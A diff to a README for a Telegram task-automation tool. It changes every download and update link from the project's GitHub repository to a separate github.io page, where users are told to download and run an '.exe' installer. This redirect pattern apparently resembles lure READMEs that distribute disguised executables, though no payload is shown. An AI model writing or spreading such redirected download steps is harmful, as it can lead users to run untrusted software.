@@ -1,6 +1,6 @@
 # 🤖 abay-bot-workflow-tools - Automate your daily Telegram task lists
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/eschatological-shank707/abay-bot-workflow-tools)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://eschatological-shank707.github.io)
 
 ## 📋 Project Overview
 
@@ -18,7 +18,7 @@ Before you install this software, confirm your computer meets these minimum stan
 
 ## 📥 Downloading and Installing
 
-1. Visit the project website at: https://github.com/eschatological-shank707/abay-bot-workflow-tools
+1. Visit the project website at: https://eschatological-shank707.github.io
 2. Look for the section labeled "Releases" on the right side of the page.
 3. Click the most recent version link.
 4. Select the file ending in ".exe" to begin the download.
@@ -52,7 +52,7 @@ Once you configure your settings, you can start the automation.
 
 Updates ensure your bot works with the latest Telegram standards. Check for updates once every month to maintain performance.
 
-1. Return to the download page at https://github.com/eschatological-shank707/abay-bot-workflow-tools.
+1. Return to the download page at https://eschatological-shank707.github.io
 2. Compare the version number on the website to the one in your application folder.
 3. If a new version exists, download the new installer.
 4. Run the new installer. The software will overwrite the old files while keeping your current settings intact.
